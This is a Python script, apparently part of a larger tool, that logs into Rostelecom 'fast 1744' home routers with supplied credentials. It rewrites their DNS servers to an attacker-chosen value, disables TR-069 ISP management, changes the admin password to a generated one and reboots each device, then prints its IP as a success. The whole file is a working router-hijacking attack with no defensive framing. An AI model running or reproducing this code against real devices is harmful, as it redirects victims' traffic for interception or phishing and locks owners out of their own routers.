import requests

from shared import DNS
from shared import get_pass
from shared import parse
from shared import TIMEOUT


def rostelekom_fast_1744(full_string):
    try:
        ip, username, password = parse(full_string)
    except ValueError:
        return False

    s = requests.Session()
    try:
        resp = s.post(
            f'http://{ip}/login.cgi',
            data={'username': username, 'password': password, 'submit.htm?login.htm': 'Send'},
            timeout=TIMEOUT
        )
        resp.raise_for_status()
    except requests.RequestException:
        return False

    if b"window.location.href='index.htm'" not in resp.content:
        return False

    s.post(
        f'http://{ip}/form2Dns.cgi',
        data={'dnsMode': '1', 'dns1': DNS, 'dns2': '', 'dns3': '', 'submit.htm?dns.htm': 'Send'},
        timeout=TIMEOUT
    ).raise_for_status()
    s.post(
        f'http://{ip}/form2Dhcpd.cgi',
        data={
            'dhcps_dnsmode': '1', 'dns1': DNS, 'dns2': '', 'dns3': '', 'submit.htm?dns.htm': 'Send',
            'save': 'Применить'
        },
        timeout=TIMEOUT
    ).raise_for_status()

    # TR069 is missing sometimes
    s.post(
        f'http://{ip}/form2cwmp.cgi',
        data={'tr069ReadOnly': 'NO', 'cwmpinformenable': 'Disable', 'submit.htm?tr069.htm': 'Send'},
        timeout=TIMEOUT
    )
    new_pass = get_pass()
    s.post(
        f'http://{ip}/form2auth.cgi',
        data={
            'username': username,
            'oldpass': password,
            'password': new_pass,
            'confirm': new_pass,
            'submit.htm?userconfig.htm': 'Send'
        },
        timeout=TIMEOUT
    )  # Password management is broken on some versions

    try:
        s.post(
            f'http://{ip}/form2Reboot.cgi',
            data='save=%D0%9F%D0%B5%D1%80%D0%B5%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%B8%D1%82%D1%8C&submit.htm'
                 '%3Freboot.htm=Send&submit.htm%3Freboot.htm=Send',
            timeout=TIMEOUT
        ).raise_for_status()
    except requests.exceptions.ReadTimeout:
        pass

    print(ip)
    return True
